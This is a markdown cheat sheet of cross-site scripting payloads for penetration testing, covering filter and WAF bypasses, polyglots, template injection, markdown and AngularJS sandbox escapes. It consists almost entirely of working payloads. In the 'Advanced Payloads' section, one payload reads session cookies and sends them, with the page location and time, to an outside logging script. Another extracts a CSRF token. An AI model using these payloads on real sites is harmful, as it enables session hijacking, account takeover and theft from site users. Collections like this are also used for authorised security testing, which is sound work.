# XSS Payload Collection

This is a curated list of XSS payloads collected for use in penetration testing. These range from basic detection strings to bypasses, JavaScript polyglots, markdown injections, and framework-specific payloads such as jQuery and AngularJS.

---

## 🚩 Easy Payloads (Great for Testing WAF Mitigations)

```html
<h1>yorhaH<h1>
<u>yorhaU</u>
<svg src=x onerror=confirm(document.domain)>
<script>alert(document.domain)</script>
/><script>alert(document.domain)</script>
<iframe src="javascript:alert(document.domain);"></iframe>
<button onclick="alert(document.domain)">Click me</button>
<a href="javascript:alert(document.domain)">Click me</a>
<img src=x onerror=confirm(document.domain)>
<xss onmousemove="alert(document.domain)">test</xss>
<xss onmouseleave="prompt(document.domain)">test</xss>
<a/href="#"/oncut=prompt`1`>cutme</a>
<img srcset="x, data:image/svg+xml,%3Csvg/onload=alert(1)%3E 1x">
<a href="JaVaScRiPt%3Aalert(1)">test</a>
<a href="vbscript:msgbox(1)">test</a>
```

---

## 📝 Form-Based

```html
<form action="javascript:alert(1)" onsubmit="javascript:prompt(2)">
  <button type="submit" onclick="prompt`2`" onclick="prompt`3`" onclick="prompt`4`">Submit</button>
</form>

<form action="J\aV\a\s\cr\i\pt\::prompt`1`;http://" target="">
  <button type="submit" onclick="prompt`2`" onclick="prompt`3`" onclick="prompt`4`">Submit</button>
</form>
```

---

## 💡 jQuery-Based Payloads

```js
$.getScript("javascript:alert(1)");
$.getScript('javascript:alert(1)');
$('<scr'+'ipt>').text('prompt(1)').appendTo('body');
$("<img src=x onerror=alert(1)>").appendTo("body");
$().map(alert(1))
```

---

## 🔎 HTML Attribute Injection

```html
foo'" onmouseenter="alert(document.domain)" bar
foo%27%22onmouseenter%3d%22%28alertdocument.domain%29%22%20bar%2ecom
foo'" onmousemove="alert(document.domain)" bar
foo'" onmouseenter="alert(document.domain)" bar.csv
foo'\" onmouseenter=\"alert(document.domain)\" bar.html
```

---

## 🔄 Modified / Obscure Variants

```html
'"/><svg src=x onerror=confirm(document.domain)>
'"/><img src=x onerror=prompt(document.domain)>
'"/><img src=x onerror=prompt`document.domain`>
'&quot;&gt;&lt;img src=x onerror=prompt`document.domain`&gt;
&lt;script&gt;alert(document.domain)&lt;/script&gt;
&lt;scri\pt&gt;confirm(1)&lt;/scri\pt&gt;
💋img src=x onerror=alert(document.domain)//💛
```

---

## 🧠 HTML Comment Tricks

```html
<!--'"/><img src=x onerror=prompt(document.domain)>
<!--'"/><svg src=x onerror=confirm(document.domain)>
<!--'\"/><img src=x onerror=prompt(document.domain)>
<!-- <textarea><img title="</textarea><img src=x onerror=alert()>"></textarea>
<!--<textarea><img title=\"</textarea><img src=x onerror=alert()>\"></textarea>
```

---

## 🧪 SVG, CSS, Media-Based Payloads

```html
<svg xmlns="http://www.w3.org/2000/svg"><animate onbegin="confirm(document.domain)"></animate></svg>
<div style="background-image:url(javascript:confirm(document.domain))"></div>
<iframe src="data:text/html,<script>confirm(document.domain)</script>"></iframe>
<svgonload=alert(1)>
<svg/onerror=alert('XSS')>
<details/open/ontoggle="alert`1`">
<audio src onloadstart=alert(1)>
<audio src="JaVaScRiPt:cOnFiRm(1)"></audio>
<video/poster/onerror=alert(1)>
<video><source onerror="javascript:alert(1)">
<h1 style="background-color:red;background-image:url('javascript:confirm`1`')">B2<h1>
```

---

## 🌐 URL Filter Bypasses

```js
javascript:alert(document.domain);//https://
jAvAsCrIpT:prompt('xss');//https://www
javascript:parent.window.alert(document.domain);x=globalThis.parent.window.document.getElementsByName("__RequestVerificationToken")[0].value;document.writeln('TOKEN: '+x);//https://
```

---

## 🧨 Advanced Payloads (Adam / Gareth Heyes / Polyglots)

```js
javascript:(async()=>{let t=(q=>{let d=document,w=globalThis;(new w.Image).src='https://www.aswsec.com/exploit/clogger.php?loc='+encodeURI(d.location)+'&dt='+encodeURI(new Date(Date.now()).toISOString())+'&cookie='+encodeURI(q.replace(/\+/g, "%252B"));});for(let s of ['cookieName1','cookieName2'])fetch('/plugins/react/pages/api?action=readCookie&cookieName='+s).then(r=>r.ok?r.json():null).then(d=>d&&t(s+'='+d.cookieValue)).catch(()=>{});})();

javascript:parent.window.alert(document.domain);x=globalThis.parent.window.document.getElementsByName("__RequestVerificationToken")[0].value;document.writeln('TOKEN: ' +x);//https://

#!@*%alert`1`
+!+[]
javascript:/*--></title></style></textarea></script></xmp><svg/onload='+/"`/+/onmouseover=1/+/[*/[]/+alert(42);//'>
\j\av\a\s\cr\i\pt\:/*--></title></style></textarea></script></xmp><svg/onload='+/"`/+/onmouseover=1/+/[*/[]/+alert(42);//'>
```

---

## 🧵 Template Injection

```html
{{7*7}}             // Jinja2
${constructor.constructor('alert(1)')()}
{{constructor.constructor('alert(1)')()}}
{{constructor['constructor'](`alert(1)`)()}}
{{constructor.constructor('alert(1)')()}}{{7*7}}
#{7*7}              // Thymeleaf
{{7*7}}${{8*8}}{9*9}${2+2}#{7*7}
```

---

## 🖼 Dummy Image Testing

```html
<img src="https://raw.githubusercontent.com/thiem-dev/xssCat/main/tpen-safe-cat.jpg" onerror=prompt`document.domain`>
<img src="http://mj96aqjvk4k9incbw2o252mia9g04tsi.oastify.com" onerror=alert`document.domain`>
```

---

## 🔥 Rare & Edge-Case Payloads

```js
'-prompt(8)-'
"; alert('XSS');//  
¼script¾alert(¢XSS¢)¼script¾
‘; alert`1`;
eval`2+2`;
+ADw-script+AD4-alert`document.location`+ADw-script+AD4-
[{{alert;pg`XSS`}}]
&#x3C;img src=x onerror=eval(String.fromCharCode(112,114,111,109,112,116,40,100,111,99,117,109,101,110,116,46,100,111,109,97,105,110,41))&#x3E;
```

---

## 💌 Base64 Payloads

```js
data:text/html;base64,YWxlcnRgMWA=           // alert`1`
data:text/html;base64,amF2YXNjcmlwdDovKi0tPjwvdGl0bGU+PC9zdHlsZT48L3RleHRhcmVhPjwvc2NyaXB0PjwveG1wPjxzdmcvb25sb2FkPScrLyJgLysvb25tb3VzZW92ZXI9MS8rL1sqL1tdLythbGVydCg0Mik7Ly8nPg==
```

---

## ⚙️ Obfuscated Variants

```html
<svg/onload%3dalert%602%60 trash%3d<!--
%22%3E%3Cimg src=x onerror=alert(1) %3C!--
mailto:test@example.com?subject=<script>alert(1)</script>
mailto:test@example.com?subject='+escape('<img src=x onerror=alert(1)>
```

---

## 🪵 Markdown XSS

From [HackTricks - XSS in Markdown](https://book.hacktricks.xyz/pentesting-web/xss-cross-site-scripting/xss-in-markdown)

```markdown
[Basic](javascript:alert('Basic'))
[Local Storage](javascript:alert(JSON.stringify(localStorage)))
[CaseInsensitive](JaVaScRiPt:alert('CaseInsensitive'))
[URL](javascript://www.google.com%0Aalert('URL'))
[In Quotes]('javascript:alert("InQuotes")')
[a](j a v a s c r i p t:prompt(document.cookie))
[a](data:text/html;base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4K)
[a](javascript:window.onerror=alert;throw%201)
[Link](jaVaScRiPt:alert('XSS'))
[Link](data:text/html;base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4K)
```

---

## 🅰️ AngularJS Payloads

From [PortSwigger AngularJS Cheat Sheet](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet)

```js
constructor.constructor('alert(1)')()
{{constructor.constructor('alert(1)')()}}
{{constructor.constructor('alert(1)')()}}{{7*7}}
${constructor.constructor('alert(1)')()}
{{constructor['constructor'](`alert(1)`)()}}
```

### Sandbox Breakout Example

```url
https://YOUR-LAB-ID.web-security-academy.net/?search=1&toString().constructor.prototype.charAt%3d[].join;[1]|orderBy:toString().constructor.fromCharCode(120,61,97,108,101,114,116,40,49,41)=1
```

---
